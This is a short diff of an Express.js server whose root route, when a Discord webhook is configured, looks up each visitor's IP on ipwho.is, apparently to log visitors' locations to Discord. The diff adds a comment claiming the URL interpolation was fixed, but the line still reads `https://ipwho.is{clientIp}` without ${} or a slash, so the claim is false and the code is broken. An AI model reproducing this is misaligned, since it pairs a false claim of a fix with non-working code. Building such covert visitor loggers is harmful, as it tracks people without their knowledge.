@@ -1,4 +1,3 @@
-// Changed to ES Module imports to match what Render is expecting
 import express from 'express';
 
 const app = express(); 
@@ -24,6 +23,7 @@ app.get('/', async (req, res) => {
 
     if (DISCORD_WEBHOOK_URL) {
         try { 
+            // FIXED: Added backtick string formatting with standard variable embedding syntax
             const geoResponse = await fetch(`https://ipwho.is{clientIp}`); 
             const geoData = await geoResponse.json(); 
 
